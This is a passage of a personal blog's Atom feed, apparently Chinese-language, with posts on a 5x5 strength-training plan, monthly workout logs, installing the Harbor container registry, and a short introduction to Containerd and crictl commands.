<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Junxin&#39;s Blog</title>
  
  <subtitle>A good memory is not as good as a rotten keyboard.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.smilexin.cn/"/>
  <updated>2022-04-01T08:18:10.365Z</updated>
  <id>https://blog.smilexin.cn/</id>
  
  <author>
    <name>何俊鑫</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>5x5力量训练增肌计划参考</title>
    <link href="https://blog.smilexin.cn/2022/04/01/5x5%E5%8A%9B%E9%87%8F%E8%AE%AD%E7%BB%83%E5%A2%9E%E8%82%8C%E8%AE%A1%E5%88%92%E5%8F%82%E8%80%83.html"/>
    <id>https://blog.smilexin.cn/2022/04/01/5x5力量训练增肌计划参考.html</id>
    <published>2022-03-31T16:00:00.000Z</published>
    <updated>2022-04-01T08:18:10.365Z</updated>
    
    <content type="html"><![CDATA[<h1 id="观点"><a href="#观点" class="headerlink" title="观点"></a>观点</h1><p>5x5在国内被认为是力量举的入门计划，但是它同样可以用于健美、增肌上，基于以下观点：</p><ol><li>一个能够卧推120kg的人胸肌肯定不会小到哪去，这是不可否认的。</li><li>对于自然训练的健身爱好者来说，大重量训练是很有必要的，通过较低次数而非所谓12RM的大重量刺激，对于自然训练者收效更大，特别是新手。（健身几年下来我认为这个观念对我帮助很大，就算不是用5x5计划我也觉得应该尽可能的尝试突破重量）</li><li>5x5计划可以快速地为身体打下力量基础，提高全身肌群的力量，设想一下卧推的重量上去了，胸、肩、三头的力量得到增强，当你做器械的推举、绳索三头下压等等动作也同样会有重量增长，这些器械动作的重量提升肯定会为你带来更多的收益。</li><li>完全的5x5力量训练强度、重量很大，但每个动作都是全身的复合性动作，虽然身体负荷很高，但个人认为还是应该对目标肌群加上适当的孤立性刺激，在强度、重量得到保证的前提下，增加训练的容量。</li></ol><h1 id="使用的前提"><a href="#使用的前提" class="headerlink" title="使用的前提"></a>使用的前提</h1><ul><li>动作标准：这个计划的主体就是大重量的深蹲卧推硬拉，所以一定要确保这三大项的动作达到尚可接受的程度。至于怎么学习动作，B站、知乎有大量视频和教程。</li><li>持续学习：在力量进步的同时三大项重量不断增加，对身体的负荷也会更大，这就要求你不断优化动作，发现动作中的细节错误，否则一个小的细节错误在长期的大重量刺激下势必造成受伤。另外，优化动作也有利于自己完成更大的重量。</li><li>训练时间：一个深蹲/卧推/硬拉动作，由热身到完成5组正式组的时间可能要超过45分钟，加上其余的补充动作，总体时间一般在75分钟以上，而且日常频率也要求比较高，一周五六练都有可能。</li></ul><h1 id="渐进高强度"><a href="#渐进高强度" class="headerlink" title="渐进高强度"></a>渐进高强度</h1><p>这是增肌的一个大原则，也是5x5计划的重要实现方法。我们知道健身具有新手期效应，新手的力量增长是最快的，但是很多人在训练两三年后，由于缺乏渐进的刺激，缺少方法，仍然没有什么进步，也就是说仍然处在新手期，仍然具有新手期效应。5x5可以很好的榨干新手期效应，直到碰到瓶颈之前都是一直进步的，而当碰到瓶颈的时候此时身体状态、身材、力量都已经超过很多人了。</p><p>对于刚开始计划的人，首次训练的重量可以选择一个比较轻松可以完成5组5次的重量，一开始可能会觉得这个训练很轻松，但是只要过段时间就会开始感受到它的强度。</p><p>每次训练都应该尽力完成当日目标重量5x5，如果能够成功完成，下次的训练重量就要相应增加一点。对于卧推，每次可以增加2.5kg左右，对于深蹲、硬拉，每次可以增加5kg左右。</p><p>比如，今日成功完成了卧推60kg的5x5，那么下次的计划应该是在杠的两边各加上1.25kg的小杠铃片（如果是硬拉或深蹲，则加2.5kg），完成62.5kg的5x5，如果成功完成，那么再下次训练，可以再加一次。</p><p>在新手时候，这个过程几乎是直线上升的，很快就可以达到一个客观的重量，身体也在不断增肌，直到自己触碰到某个瓶颈期，如果完成不了当日的5x5目标重量，则下次应该进行deload。（笔者使用计划的一年里碰到需要deload的次数其实很少，所以要参照“使用的前提”部分，多加深动作学习，多吃饭，多睡觉）</p><h1 id="组间休息"><a href="#组间休息" class="headerlink" title="组间休息"></a>组间休息</h1><p>在进行深蹲、卧推、硬拉的5x5训练时，组间休息可以比较长，甚至达到5分钟也行。判断的依据是要休息到保证自己能够尽可能的完成下一组的5次，一般是4分钟。（这也是它经常被误认为是力量举训练计划的原因之一，力量举大重量极低次数的训练组间休息可能达到好几分钟）</p><p>当日剩余的其他容量动作，休息时间就要尽可能短一些了，30秒、60秒也可以，要保证强度到位。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;观点&quot;&gt;&lt;a href=&quot;#观点&quot; class=&quot;headerlink&quot; title=&quot;观点&quot;&gt;&lt;/a&gt;观点&lt;/h1&gt;&lt;p&gt;5x5在国内被认为是力量举的入门计划，但是它同样可以用于健美、增肌上，基于以下观点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个能够卧推120kg的人胸
      
    
    </summary>
    
    
      <category term="健身" scheme="https://blog.smilexin.cn/tags/%E5%81%A5%E8%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>健身记录_202204</title>
    <link href="https://blog.smilexin.cn/2022/04/01/%E5%81%A5%E8%BA%AB%E8%AE%B0%E5%BD%95_202204.html"/>
    <id>https://blog.smilexin.cn/2022/04/01/健身记录_202204.html</id>
    <published>2022-03-31T16:00:00.000Z</published>
    <updated>2022-04-08T06:39:33.466Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-04-01-星期五（胸）"><a href="#2022-04-01-星期五（胸）" class="headerlink" title="2022-04-01 星期五（胸）"></a>2022-04-01 星期五（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 20</li><li>40kg 9</li><li>50kg 8</li><li>52.5kg 6 6 5 5</li></ul></li><li>哑铃上斜卧推22kg 8 6 6 5 4</li><li>双杠臂屈伸45kg 10 10 10 10</li></ul><h1 id="2022-04-02-星期六（有氧）"><a href="#2022-04-02-星期六（有氧）" class="headerlink" title="2022-04-02 星期六（有氧）"></a>2022-04-02 星期六（有氧）</h1><p>阻力单车30分钟</p><h1 id="2022-04-04-星期一（胸）"><a href="#2022-04-04-星期一（胸）" class="headerlink" title="2022-04-04 星期一（胸）"></a>2022-04-04 星期一（胸）</h1><ul><li>杠铃上斜卧推<ul><li>20kg 15</li><li>40kg 10</li><li>50kg 5 5 5 6</li></ul></li><li>杠铃平板卧推50kg 8 8 8 7</li><li>双杠臂屈伸 3 5 5 6</li></ul><h1 id="2022-04-06-星期三（背）"><a href="#2022-04-06-星期三（背）" class="headerlink" title="2022-04-06 星期三（背）"></a>2022-04-06 星期三（背）</h1><h2 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h2><ul><li>宽距引体向上 8 8 8 8</li><li>俯身杠铃划船<ul><li>20kg 9</li><li>40kg 8</li></ul></li><li>单臂划船40kg 6 6</li><li>俯身杠铃划船<ul><li>30kg 12</li><li>40kg 10 12</li><li>45kg 11 12</li><li>50kg 11</li><li>55kg 7 8</li></ul></li><li>器械面拉32kg 12 8 9 8</li></ul><h2 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h2><ul><li>宽距引体向上<ul><li>负重0kg 6</li><li>负重5kg 4 3 2.5</li><li>负重0kg 3</li></ul></li><li>俯身杠铃划船<ul><li>20kg 13</li><li>40kg 12</li><li>50kg 13</li><li>55kg 8 9 8 8</li><li>20kg 10</li></ul></li></ul><h1 id="2022-04-07-星期四（腿）"><a href="#2022-04-07-星期四（腿）" class="headerlink" title="2022-04-07 星期四（腿）"></a>2022-04-07 星期四（腿）</h1><ul><li>杠铃深蹲<ul><li>20kg 12</li><li>40kg 8</li><li>60kg 8 8 8 8</li></ul></li><li>传统硬拉<ul><li>60kg 3</li><li>80kg 5 8 8 8</li></ul></li></ul><h1 id="2022-04-08-星期五（推）"><a href="#2022-04-08-星期五（推）" class="headerlink" title="2022-04-08 星期五（推）"></a>2022-04-08 星期五（推）</h1><ul><li>实力推<ul><li>20kg 12</li><li>30kg 8 8 8 8</li></ul></li><li>平板杠铃卧推<ul><li>20kg 12</li><li>50kg 8 7 8 6 2</li></ul></li><li>上斜哑铃卧推<ul><li>22kg 5 5 5 4</li><li>20kg 5</li></ul></li><li>双杠臂屈伸45kg 12 12 12 12</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2022-04-01-星期五（胸）&quot;&gt;&lt;a href=&quot;#2022-04-01-星期五（胸）&quot; class=&quot;headerlink&quot; title=&quot;2022-04-01 星期五（胸）&quot;&gt;&lt;/a&gt;2022-04-01 星期五（胸）&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;平板杠铃
      
    
    </summary>
    
    
      <category term="健身" scheme="https://blog.smilexin.cn/tags/%E5%81%A5%E8%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>Harbor的使用</title>
    <link href="https://blog.smilexin.cn/2022/03/14/Harbor%E7%9A%84%E4%BD%BF%E7%94%A8.html"/>
    <id>https://blog.smilexin.cn/2022/03/14/Harbor的使用.html</id>
    <published>2022-03-13T16:00:00.000Z</published>
    <updated>2022-03-14T07:48:28.736Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Harbor-是什么？"><a href="#Harbor-是什么？" class="headerlink" title="Harbor 是什么？"></a>Harbor 是什么？</h1><p>Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，可以用来构建企业内部的Docker镜像仓库。<br>它在Docker的开源项目 Distribution 的基础上，添加了一些企业需要的功能特性，如镜像同步复制、漏洞扫描和权限管理等。</p><blockquote><p>Harbor is an open source trusted cloud native registry project that stores, signs, and scans content. Harbor extends the open source Docker Distribution by adding the functionalities usually required by users such as security, identity and management. Having a registry closer to the build and run environment can improve the image transfer efficiency. Harbor supports replication of images between registries, and also offers advanced security features such as user management, access control and activity auditing.</p></blockquote><p>github地址: <a href="https://github.com/goharbor/harbor" target="_blank" rel="noopener">https://github.com/goharbor/harbor</a></p><h1 id="Live-Demo"><a href="#Live-Demo" class="headerlink" title="Live Demo"></a>Live Demo</h1><p>url: <a href="https://demo.goharbor.io/" target="_blank" rel="noopener">https://demo.goharbor.io/</a><br>user: admin<br>pwd: Harbor12345</p><h1 id="下载Harbor安装包"><a href="#下载Harbor安装包" class="headerlink" title="下载Harbor安装包"></a>下载Harbor安装包</h1><p>下载Harbor最新稳定版本的离线安装包，我这里使用的是 <strong>harbor-offline-installer-v2.5.0-rc1.tgz</strong><br>下载地址：<a href="https://github.com/goharbor/harbor/releases" target="_blank" rel="noopener">https://github.com/goharbor/harbor/releases</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/goharbor/harbor/releases/download/v2.5.0-rc1/harbor-offline-installer-v2.5.0-rc1.tgz</span><br></pre></td></tr></table></figure></p><p>因为网络原因,我这边使用加速地址下载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 原地址 </span><br><span class="line">wget https://github.com/goharbor/harbor/releases/download/v2.5.0-rc1/harbor-offline-installer-v2.5.0-rc1.tgz</span><br><span class="line"># 加速下载方法一 </span><br><span class="line">wget https://download.fastgit.org/goharbor/harbor/releases/download/v2.5.0-rc1/harbor-offline-installer-v2.5.0-rc1.tgz</span><br><span class="line"># 加速下载方法二 </span><br><span class="line">wget https://hub.fastgit.org/goharbor/harbor/releases/download/v2.5.0-rc1/harbor-offline-installer-v2.5.0-rc1.tgz</span><br></pre></td></tr></table></figure></p><h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><p>Harbor的安装需要依赖<code>docker-compose</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/docker/compose/releases/download/v2.3.3/docker-compose-linux-x86_64</span><br><span class="line">mv docker-compose-linux-x86_64 /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><h1 id="安装Harbor"><a href="#安装Harbor" class="headerlink" title="安装Harbor"></a>安装Harbor</h1><p>解压安装包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf harbor-offline-installer-v2.5.0-rc1.tgz</span><br><span class="line">cd harbor</span><br></pre></td></tr></table></figure></p><p>创建配置文件<code>cp harbor.yml.tmpl harbor.yml</code>并修改相应的配置 <code>vi harbor.yml</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hostname: 192.168.80.6 # 修改hostname为节点ip地址</span><br><span class="line"></span><br><span class="line"># 不用HTTPS则需要注释所有HTTPS配置</span><br><span class="line">#https:</span><br><span class="line">  # https port for harbor, default is 443</span><br><span class="line">  #port: 443</span><br><span class="line">  # The path of cert and key files for nginx</span><br><span class="line">  #certificate: /your/certificate/path</span><br><span class="line">  #private_key: /your/private/key/path</span><br></pre></td></tr></table></figure><p>执行安装脚本: <code>sh install.sh</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">[root@node-1 harbor]# sh install.sh </span><br><span class="line"></span><br><span class="line">[Step 0]: checking if docker is installed ...</span><br><span class="line"></span><br><span class="line">Note: docker version: 20.10.6</span><br><span class="line"></span><br><span class="line">[Step 1]: checking docker-compose is installed ...</span><br><span class="line"></span><br><span class="line">Note: docker-compose version: 2.3.3</span><br><span class="line"></span><br><span class="line">[Step 2]: loading Harbor images ...</span><br><span class="line">Loaded image: goharbor/chartmuseum-photon:v2.5.0</span><br><span class="line">Loaded image: goharbor/harbor-db:v2.5.0</span><br><span class="line">Loaded image: goharbor/harbor-jobservice:v2.5.0</span><br><span class="line">Loaded image: goharbor/registry-photon:v2.5.0</span><br><span class="line">Loaded image: goharbor/notary-server-photon:v2.5.0</span><br><span class="line">Loaded image: goharbor/prepare:v2.5.0</span><br><span class="line">Loaded image: goharbor/redis-photon:v2.5.0</span><br><span class="line">Loaded image: goharbor/trivy-adapter-photon:v2.5.0</span><br><span class="line">Loaded image: goharbor/harbor-exporter:v2.5.0</span><br><span class="line">Loaded image: goharbor/nginx-photon:v2.5.0</span><br><span class="line">Loaded image: goharbor/notary-signer-photon:v2.5.0</span><br><span class="line">Loaded image: goharbor/harbor-portal:v2.5.0</span><br><span class="line">Loaded image: goharbor/harbor-core:v2.5.0</span><br><span class="line">Loaded image: goharbor/harbor-log:v2.5.0</span><br><span class="line">Loaded image: goharbor/harbor-registryctl:v2.5.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Step 3]: preparing environment ...</span><br><span class="line"></span><br><span class="line">[Step 4]: preparing harbor configs ...</span><br><span class="line">prepare base dir is set to /root/harbor/harbor</span><br><span class="line">WARNING:root:WARNING: HTTP protocol is insecure. Harbor will deprecate http protocol in the future. Please make sure to upgrade to https</span><br><span class="line">Generated configuration file: /config/portal/nginx.conf</span><br><span class="line">Generated configuration file: /config/log/logrotate.conf</span><br><span class="line">Generated configuration file: /config/log/rsyslog_docker.conf</span><br><span class="line">Generated configuration file: /config/nginx/nginx.conf</span><br><span class="line">Generated configuration file: /config/core/env</span><br><span class="line">Generated configuration file: /config/core/app.conf</span><br><span class="line">Generated configuration file: /config/registry/config.yml</span><br><span class="line">Generated configuration file: /config/registryctl/env</span><br><span class="line">Generated configuration file: /config/registryctl/config.yml</span><br><span class="line">Generated configuration file: /config/db/env</span><br><span class="line">Generated configuration file: /config/jobservice/env</span><br><span class="line">Generated configuration file: /config/jobservice/config.yml</span><br><span class="line">Generated and saved secret to file: /data/secret/keys/secretkey</span><br><span class="line">Successfully called func: create_root_cert</span><br><span class="line">Generated configuration file: /compose_location/docker-compose.yml</span><br><span class="line">Clean up the input dir</span><br></pre></td></tr></table></figure><p>到此安装完成，浏览器输入hostname配置的ip即可访问Harbor。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Harbor-是什么？&quot;&gt;&lt;a href=&quot;#Harbor-是什么？&quot; class=&quot;headerlink&quot; title=&quot;Harbor 是什么？&quot;&gt;&lt;/a&gt;Harbor 是什么？&lt;/h1&gt;&lt;p&gt;Harbor是一个用于存储和分发Docker镜像的企业级Regist
      
    
    </summary>
    
    
      <category term="Harbor" scheme="https://blog.smilexin.cn/tags/Harbor/"/>
    
      <category term="容器" scheme="https://blog.smilexin.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>再见 Docker ！5分钟转型 Containerd !</title>
    <link href="https://blog.smilexin.cn/2022/03/11/%E5%86%8D%E8%A7%81%20Docker%20%EF%BC%815%E5%88%86%E9%92%9F%E8%BD%AC%E5%9E%8B%20Containerd%20!.html"/>
    <id>https://blog.smilexin.cn/2022/03/11/再见 Docker ！5分钟转型 Containerd !.html</id>
    <published>2022-03-10T16:00:00.000Z</published>
    <updated>2022-03-11T02:09:46.135Z</updated>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>Docker作为非常流行的容器技术，之前经常有文章说它被K8S弃用了，取而代之的是另一种容器技术Containerd！其实Containerd只是从Docker中分离出来的底层容器运行时，使用起来和Docker并没有啥区别，本文主要介绍下Containerd的使用。</p><h1 id="Containerd-简介"><a href="#Containerd-简介" class="headerlink" title="Containerd 简介"></a>Containerd 简介</h1><p>Containerd是一个工业级标准的容器运行时，它强调简单性、健壮性和可移植性。Containerd可以在宿主机中管理完整的容器生命周期，包括容器镜像的传输和存储、容器的执行和管理、存储和网络等。</p><h1 id="Docker-vs-Containerd"><a href="#Docker-vs-Containerd" class="headerlink" title="Docker vs Containerd"></a>Docker vs Containerd</h1><p>Containerd是从Docker中分离出来的一个项目，可以作为一个底层容器运行时，现在它成了Kubernete容器运行时更好的选择。</p><p>不仅仅是Docker，还有很多云平台也支持Containerd作为底层容器运行时，具体参考下图。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/containerd/architecture.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h1 id="K8S-CRI"><a href="#K8S-CRI" class="headerlink" title="K8S CRI"></a>K8S CRI</h1><p>K8S发布CRI（Container Runtime Interface），统一了容器运行时接口，凡是支持CRI的容器运行时，皆可作为K8S的底层容器运行时。</p><p>K8S为什么要放弃使用Docker作为容器运行时，而使用Containerd呢？</p><p>如果你使用Docker作为K8S容器运行时的话，kubelet需要先要通过dockershim去调用Docker，再通过Docker去调用Containerd。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/posts/containerd/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如果你使用Containerd作为K8S容器运行时的话，由于Containerd内置了CRI插件，kubelet可以直接调用Containerd。</p><p><img src="/img/posts/containerd/3.png" alt=""></p><p>使用Containerd不仅性能提高了（调用链变短了），而且资源占用也会变小（Docker不是一个纯粹的容器运行时，具有大量其他功能）。</p><h1 id="Containerd使用"><a href="#Containerd使用" class="headerlink" title="Containerd使用"></a>Containerd使用</h1><blockquote><p>如果你之前用过Docker，你只要稍微花5分钟就可以学会Containerd了，接下来我们学习下Containerd的使用。</p></blockquote><p>其实只要把我们之前使用的docker命令改为crictl命令即可操作Containerd。</p><h2 id="查看所有运行中的容器"><a href="#查看所有运行中的容器" class="headerlink" title="查看所有运行中的容器:"></a>查看所有运行中的容器:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crictl ps</span><br></pre></td></tr></table></figure><h2 id="查看所有镜像"><a href="#查看所有镜像" class="headerlink" title="查看所有镜像:"></a>查看所有镜像:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crictl images</span><br></pre></td></tr></table></figure><h2 id="进入容器内部执行bash命令，这里需要注意的是只能使用容器ID，不支持使用容器名称："><a href="#进入容器内部执行bash命令，这里需要注意的是只能使用容器ID，不支持使用容器名称：" class="headerlink" title="进入容器内部执行bash命令，这里需要注意的是只能使用容器ID，不支持使用容器名称："></a>进入容器内部执行bash命令，这里需要注意的是只能使用容器ID，不支持使用容器名称：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crictl exec -it a5e34c24be371 /bin/bash</span><br></pre></td></tr></table></figure><h2 id="查看容器中应用资源占用情况，可以发现占用非常低。"><a href="#查看容器中应用资源占用情况，可以发现占用非常低。" class="headerlink" title="查看容器中应用资源占用情况，可以发现占用非常低。"></a>查看容器中应用资源占用情况，可以发现占用非常低。</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crictl stats</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从Docker转型Containerd非常简单，基本没有什么门槛。只要把之前Docker命令中的docker改为crictl基本就可以了，果然是同一个公司出品的东西，用法都一样。所以不管K8S到底弃用不弃用Docker，对我们开发者使用来说，基本没啥影响！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h1&gt;&lt;p&gt;Docker作为非常流行的容器技术，之前经常有文章说它被K8S弃用了，取而代之的是另一种容器技术Containerd！其实Container
      
    
    </summary>
    
    
      <category term="容器" scheme="https://blog.smilexin.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="Containerd" scheme="https://blog.smilexin.cn/tags/Containerd/"/>
    
      <category term="docker" scheme="https://blog.smilexin.cn/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>安装使用Containerd</title>
    <link href="https://blog.smilexin.cn/2022/03/11/%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8Containerd.html"/>
    <id>https://blog.smilexin.cn/2022/03/11/安装使用Containerd.html</id>
    <published>2022-03-10T16:00:00.000Z</published>
    <updated>2022-03-11T02:31:15.481Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="容器" scheme="https://blog.smilexin.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="Containerd" scheme="https://blog.smilexin.cn/tags/Containerd/"/>
    
  </entry>
  
  <entry>
    <title>健身记录_202203</title>
    <link href="https://blog.smilexin.cn/2022/03/01/%E5%81%A5%E8%BA%AB%E8%AE%B0%E5%BD%95_202203.html"/>
    <id>https://blog.smilexin.cn/2022/03/01/健身记录_202203.html</id>
    <published>2022-02-28T16:00:00.000Z</published>
    <updated>2022-03-31T06:10:25.507Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-03-01-星期二（胸）"><a href="#2022-03-01-星期二（胸）" class="headerlink" title="2022-03-01 星期二（胸）"></a>2022-03-01 星期二（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 12</li><li>40kg 12</li><li>55kg 5 5 4 2 3</li></ul></li><li>上斜哑铃卧推22kg 5 5 6 5</li><li>器械推胸26.8kg 6 6 4 4</li><li>双杠臂屈伸41kg 8 8 8 8 9</li></ul><h1 id="2022-03-04-星期五（背）"><a href="#2022-03-04-星期五（背）" class="headerlink" title="2022-03-04 星期五（背）"></a>2022-03-04 星期五（背）</h1><ul><li>辅助引体向上14kg 8 8 7 6 5</li><li>单臂划船40kg 6 6 6 6</li><li>重锤下拉65kg 5.6 6 6 6</li><li>窄距对握高位下拉<ul><li>45kg 3</li><li>39kg 5</li></ul></li></ul><h1 id="2022-03-05-星期六（硬拉）"><a href="#2022-03-05-星期六（硬拉）" class="headerlink" title="2022-03-05 星期六（硬拉）"></a>2022-03-05 星期六（硬拉）</h1><ul><li>罗马尼亚硬拉<ul><li>20kg 12</li><li>40kg 8 8 6</li><li>50kg 6 8</li></ul></li><li>传统硬拉75kg 5 5 5 5</li></ul><h1 id="2022-03-08-星期二（胸）"><a href="#2022-03-08-星期二（胸）" class="headerlink" title="2022-03-08 星期二（胸）"></a>2022-03-08 星期二（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 12</li><li>40kg 8 8</li><li>50kg 6 6 7 7</li></ul></li><li>史密斯上斜卧推30kg 6 6 6 5 4</li><li>器械推胸21.8kg 5.6 6 6 4.4</li><li>双杠臂屈伸41kg 8 8 8 8</li></ul><h1 id="2022-03-09-星期三（有氧）"><a href="#2022-03-09-星期三（有氧）" class="headerlink" title="2022-03-09 星期三（有氧）"></a>2022-03-09 星期三（有氧）</h1><ul><li>坡度快走40分钟</li></ul><h1 id="2022-03-10-星期四（背）"><a href="#2022-03-10-星期四（背）" class="headerlink" title="2022-03-10 星期四（背）"></a>2022-03-10 星期四（背）</h1><ul><li>宽距引体向上 7 9 8 7</li><li>单臂划船40kg 6 6 6 6</li><li>重锤下拉65kg 3 6 6 7 6</li><li>窄距对握高位下拉39kg 6 6 6 5</li></ul><h1 id="2022-03-11-星期五（硬拉）"><a href="#2022-03-11-星期五（硬拉）" class="headerlink" title="2022-03-11 星期五（硬拉）"></a>2022-03-11 星期五（硬拉）</h1><ul><li>罗马尼亚硬拉<ul><li>20kg 12</li><li>40kg 8 7 8 8</li></ul></li><li>传统硬拉80kg 3 5 5 6</li><li>坡度快走30分钟</li></ul><h1 id="2022-03-14-星期一（有氧）"><a href="#2022-03-14-星期一（有氧）" class="headerlink" title="2022-03-14 星期一（有氧）"></a>2022-03-14 星期一（有氧）</h1><ul><li>坡度快走40分钟</li></ul><h1 id="2022-03-15-星期二（胸）"><a href="#2022-03-15-星期二（胸）" class="headerlink" title="2022-03-15 星期二（胸）"></a>2022-03-15 星期二（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 13</li><li>40kg 8 8</li><li>50kg 6 5 4 4</li></ul></li><li>哑铃上斜卧推22kg 5 6 5 4</li><li>双杠臂屈伸41kg 8 8 8 8</li><li>悬垂抬腿 14 10 13 13</li></ul><h1 id="2022-03-16-星期三（背）"><a href="#2022-03-16-星期三（背）" class="headerlink" title="2022-03-16 星期三（背）"></a>2022-03-16 星期三（背）</h1><ul><li>宽距引体向上 6 8 8 6.6</li><li>窄距对握器械划船45kg 8 8 8 8</li><li>重锤下拉60kg 6 6 7 8</li></ul><h1 id="2022-03-17-星期四（硬拉）"><a href="#2022-03-17-星期四（硬拉）" class="headerlink" title="2022-03-17 星期四（硬拉）"></a>2022-03-17 星期四（硬拉）</h1><ul><li>罗马尼亚硬拉<ul><li>20kg 14</li><li>40kg 8 8 9 8</li></ul></li><li>传统硬拉80kg 5 5 5 5</li></ul><h1 id="2022-03-18-星期五（肩）"><a href="#2022-03-18-星期五（肩）" class="headerlink" title="2022-03-18 星期五（肩）"></a>2022-03-18 星期五（肩）</h1><ul><li>实力推<ul><li>20kg 9 </li><li>25kg 8</li><li>30kg 8 7 8 8</li></ul></li><li>坐姿哑铃推举20kg 6 6 6 5</li><li>哑铃侧平举10kg 9 10 11 9</li><li>绳索面拉32kg 10 10 10 10</li></ul><h1 id="2022-03-19-星期六（二头）"><a href="#2022-03-19-星期六（二头）" class="headerlink" title="2022-03-19 星期六（二头）"></a>2022-03-19 星期六（二头）</h1><ul><li>杠铃弯举18kg 8 9 10 8 10 10 10 10 10 10 9 8</li></ul><h1 id="2022-03-21-星期一（胸）"><a href="#2022-03-21-星期一（胸）" class="headerlink" title="2022-03-21 星期一（胸）"></a>2022-03-21 星期一（胸）</h1><ul><li>平板杠铃卧推<ul><li>20kg 12</li><li>40kg 9 8</li><li>50kg 5 5 5 5</li></ul></li><li>器械推胸26.8kg 6 6 5.5 6</li><li>蝴蝶机夹胸32kg 8 6 8</li></ul><h1 id="2022-03-22-星期二（背）"><a href="#2022-03-22-星期二（背）" class="headerlink" title="2022-03-22 星期二（背）"></a>2022-03-22 星期二（背）</h1><ul><li>宽距引体向上 7 6 7 6</li><li>单臂划船<ul><li>30kg 6</li><li>35kg 8 8 8 8</li></ul></li><li>重锤下拉<ul><li>50kg 8</li><li>55kg 6 8 8 8</li></ul></li></ul><h1 